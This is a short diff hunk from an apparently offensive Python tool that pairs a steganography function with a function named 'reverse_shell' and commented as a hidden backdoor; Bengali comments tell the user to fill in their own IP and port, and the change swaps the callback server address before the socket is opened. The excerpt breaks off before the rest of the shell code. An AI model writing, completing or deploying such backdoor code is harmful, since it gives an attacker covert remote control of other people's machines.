@@ -12,7 +12,7 @@ def hide_data(image_path, secret_message, output_image):
 # Reverse Shell: Hidden Backdoor
 def reverse_shell():
     # সঠিক IP এবং পোর্ট দিন
-    server_ip = "10.72.47.93"  # আপনার IP এখানে দিন
+    server_ip = "10.103.77.213"  # আপনার IP এখানে দিন
     server_port = 8080  # আপনার পোর্ট নম্বর এখানে দিন
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
